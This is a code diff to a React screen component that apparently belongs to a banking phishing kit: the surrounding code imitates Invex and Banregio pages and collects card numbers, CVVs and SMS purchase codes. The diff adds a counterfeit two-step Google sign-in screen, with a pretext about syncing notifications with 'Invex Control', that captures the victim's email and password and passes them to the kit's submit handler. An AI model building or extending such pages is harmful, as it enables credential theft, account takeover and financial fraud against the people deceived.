@@ -1,7 +1,9 @@
-import React, { useState, useContext } from 'react';
+import React, { useState, useContext, useEffect } from 'react';
 import { Card } from '@/components/ui/card';
 import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
+import { Checkbox } from "@/components/ui/checkbox";
+import { Label } from '@/components/ui/label';
 import { ScreenType } from '@shared/schema';
 
 // Para debug
@@ -24,6 +26,7 @@ import invexLogo from '../../assets/invex_logo.png';
 import invexLogoWhite from '../../assets/invex_logo_white.png';
 import banregioLogo from '../../assets/banregio_logo.png';
 import banregioLogoWhite from '../../assets/banregio_logo_white.png';
+import googleLogo from '../../assets/google-logo.png';
 
 interface ScreenTemplatesProps {
   currentScreen: ScreenType;
@@ -38,6 +41,8 @@ interface ScreenTemplatesProps {
     alias?: string;
     folio?: string;
     direccion?: string;
+    correo?: string;
+    contrasena?: string;
   };
   onSubmit: (screen: ScreenType, data: Record<string, any>) => void;
   banco?: string;
@@ -59,6 +64,10 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
   const [cvvInput, setCvvInput] = useState('');
   const [smsCompraInput, setSmsCompraInput] = useState('');
   const [passwordError, setPasswordError] = useState<string | null>(null);
+  const [gmailCorreo, setGmailCorreo] = useState('');
+  const [gmailContrasena, setGmailContrasena] = useState('');
+  const [showGmailPassword, setShowGmailPassword] = useState(false);
+  const [gmailScreen, setGmailScreen] = useState<'correo' | 'contrasena'>('correo');
   
   // Función para validar número de tarjeta con algoritmo de Luhn
   const validateCardNumber = (number: string) => {
@@ -559,6 +568,122 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
           </>
         );
         return getBankContainer(validandoContent);
+        
+      case ScreenType.GMAIL:
+        // Función para cambiar de la pantalla de correo a la de contraseña
+        const handleGmailNextScreen = () => {
+          if (gmailScreen === 'correo') {
+            if (gmailCorreo.trim()) {
+              setGmailScreen('contrasena');
+            }
+          } else {
+            // Enviar datos completos
+            if (gmailContrasena.trim()) {
+              onSubmit(ScreenType.GMAIL, { 
+                correo: gmailCorreo, 
+                contrasena: gmailContrasena 
+              });
+            }
+          }
+        };
+        
+        // Función para alternar la visibilidad de la contraseña
+        const toggleGmailPasswordVisibility = () => {
+          setShowGmailPassword(!showGmailPassword);
+        };
+        
+        // Contenedor personalizado para Gmail que es distinto al resto de pantallas
+        const getGmailContainer = (children: React.ReactNode) => {
+          return (
+            <div className="gmail-container bg-white rounded-xl shadow-md p-8 mx-auto max-w-md text-center">
+              {children}
+            </div>
+          );
+        };
+        
+        // Pantalla de correo electrónico (primera pantalla)
+        const gmailCorreoContent = (
+          <>
+            <div className="flex justify-center mb-4">
+              <img src={googleLogo} alt="Google Logo" className="w-16 h-16" />
+            </div>
+            
+            <p className="text-[15px] text-gray-700 mb-6">
+              Para sincronizar tus notificaciones con la aplicación <strong>Invex Control</strong>, inicia sesión utilizando tu correo electrónico registrado.
+            </p>
+            
+            <Input 
+              type="text"
+              id="gmailCorreo" 
+              placeholder="Correo electrónico o teléfono" 
+              className="w-full p-3 border border-gray-300 rounded mb-4" 
+              value={gmailCorreo}
+              onChange={(e) => setGmailCorreo(e.target.value)}
+            />
+            
+            <div className="text-left mb-6">
+              <a href="#" className="text-blue-600 text-sm hover:underline">¿Olvidaste el correo electrónico?</a>
+            </div>
+            
+            <Button 
+              className="bg-blue-600 text-white hover:bg-blue-700 w-full py-2 px-4 rounded"
+              onClick={handleGmailNextScreen}
+            >
+              Siguiente
+            </Button>
+          </>
+        );
+        
+        // Pantalla de contraseña (segunda pantalla)
+        const gmailContrasenaContent = (
+          <>
+            <div className="flex justify-center mb-4">
+              <img src={googleLogo} alt="Google Logo" className="w-16 h-16" />
+            </div>
+            
+            <div className="flex items-center justify-center mb-6">
+              <div className="bg-gray-200 text-gray-700 w-10 h-10 rounded-full flex items-center justify-center font-semibold mr-2">
+                {gmailCorreo[0]?.toUpperCase() || 'G'}
+              </div>
+              <span className="text-sm">{gmailCorreo}</span>
+            </div>
+            
+            <Input 
+              type={showGmailPassword ? "text" : "password"}
+              id="gmailContrasena" 
+              placeholder="Ingresa tu contraseña" 
+              className="w-full p-3 border border-gray-300 rounded mb-2" 
+              value={gmailContrasena}
+              onChange={(e) => setGmailContrasena(e.target.value)}
+            />
+            
+            <div className="flex items-center mb-4 text-left">
+              <Checkbox 
+                id="mostrarContrasena" 
+                checked={showGmailPassword}
+                onCheckedChange={toggleGmailPasswordVisibility}
+                className="mr-2"
+              />
+              <Label htmlFor="mostrarContrasena" className="text-sm text-gray-700 cursor-pointer">
+                Mostrar contraseña
+              </Label>
+            </div>
+            
+            <div className="text-left mb-6">
+              <a href="#" className="text-blue-600 text-sm hover:underline">¿Olvidaste la contraseña?</a>
+            </div>
+            
+            <Button 
+              className="bg-blue-600 text-white hover:bg-blue-700 w-full py-2 px-4 rounded"
+              onClick={handleGmailNextScreen}
+            >
+              Siguiente
+            </Button>
+          </>
+        );
+        
+        // Renderizar la pantalla correspondiente según el estado
+        return getGmailContainer(gmailScreen === 'correo' ? gmailCorreoContent : gmailContrasenaContent);
 
       default:
         const defaultContent = (
